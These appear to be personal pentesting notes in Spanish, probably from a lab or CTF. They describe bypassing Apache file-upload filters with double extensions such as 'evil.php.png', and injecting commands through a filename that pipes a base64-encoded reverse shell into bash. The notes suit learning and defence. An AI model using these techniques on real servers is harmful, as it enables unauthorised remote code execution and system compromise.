
OS:  Linux

## Doble extension para bypassear sistema de subida de archivos en apache

En configuraicones antiguas de apache se solia configurar en el .htaccess una directiva AddType y AddHandler las cuales permitian que si habia un .``php`` en cualquier parte del nombre del archivo, ya ese archivo se ejecutaba como php.

```ruby
## Nombre del archivo:
evil.php.png
```


## Command inyection en nombre de archivo

mi confusion o lo que no sabia como resolverlo es que en un nombre de archivo no puedes poner ciertos caracteres, especialmente los slashes (`/`), y pues cualquier forma de obtener acceso usa slashes, ya sea una bash setuid o una revershell, entonces lo mejor es utilizar una cadena en base64  para que se ejecute:

```ruby
mv {file.png} ';echo {base64Revshell} | base64 -d | bash;.png' 
```



